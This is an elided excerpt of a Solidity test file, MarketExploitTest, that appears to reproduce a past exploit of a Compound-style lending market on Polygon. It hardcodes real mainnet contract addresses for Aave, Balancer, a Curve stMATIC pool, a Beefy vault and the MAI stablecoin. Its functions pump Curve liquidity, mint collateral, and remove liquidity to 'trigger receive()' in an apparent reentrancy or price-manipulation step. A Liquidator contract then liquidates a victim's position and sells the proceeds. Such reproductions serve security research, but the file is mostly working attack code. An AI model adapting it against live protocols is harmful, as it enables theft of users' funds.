...
import {IUniswapV3Router02 as IUniswapV3Router} from "src/interfaces/IUniswapV3Router02.sol";
...
contract Liquidator {
    ...
    BeefyVault private constant beefyVault =
        BeefyVault(0xE0570ddFca69E5E90d83Ea04bb33824D3BbE6a85);
    IERC20 private constant miMATIC =
    ...
    function liquidate(address main) external {
        ...
        require(
            CErc20Delegate_mMAI_4.liquidateBorrow(
                main,
                70_420 ether,
                address(CErc20_mmooCurvestMATIC_MATIC_4)
            ) == 0,
            "liquidate failed"
        );

        // redeem beefyVault token (mooCurvestMATIC-MATIC)
        CErc20_mmooCurvestMATIC_MATIC_4.redeem(
            CErc20_mmooCurvestMATIC_MATIC_4.balanceOf(address(this))
        );
...
contract MarketExploitTest is Test {
    IWETH private constant WMATIC =
        IWETH(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
    IERC20 private constant stMATIC =
        IERC20(0x3A58a54C066FdC0f2D55FC9C89F0415C92eBf3C4);

    ILendingPool private constant aaveLendingPool =
        ILendingPool(0x8dFf5E27EA6b7AC08EbFdf9eB090F32ee9a30fcf);
    IBalancerVault private constant balancerVault =
        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    ICurvePool private constant vyperContract =
        ICurvePool(0xFb6FE7802bA9290ef8b00CA16Af4Bc26eb663a28);
    IERC20 private constant stMATIC_f =
        IERC20(0xe7CEA2F6d7b120174BF3A9Bc98efaF1fF72C997d); // Curve LP token
    BeefyVault private constant beefyVault =
        BeefyVault(0xE0570ddFca69E5E90d83Ea04bb33824D3BbE6a85); // mooCurvestMATIC-MATIC

    IUnitroller private constant unitroller =
    ...
    IUniswapV3Router private constant routerV3 =
        IUniswapV3Router(payable(0xf5b509bB0909a69B1c207E495f687a596C168E12));
    ...
    IERC20 private constant miMATIC =
        IERC20(0xa3Fa99A148fA48D14Ed51d610c367C61876997F1); // MAI stablecoin
    ...
    function _exploit() internal {
        ...
        vyperContract.add_liquidity(
            [uint256(19_664_260 ether), uint256(49_999_999 ether)],
            0
        ); // mint 34_640_026 stMATIC_f
        ...
        CErc20_mmooCurvestMATIC_MATIC_4.mint(
        ...
        vyperContract.remove_liquidity(
            ...
            [uint256(0), uint256(0)],
            true
        ); // burn stMATIC_f, trigger receive()
    }
    ...
    function _sellAll() internal {
        ...
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            miMATIC.balanceOf(address(this)),
            0,
            path,
            address(this),
            type(uint256).max
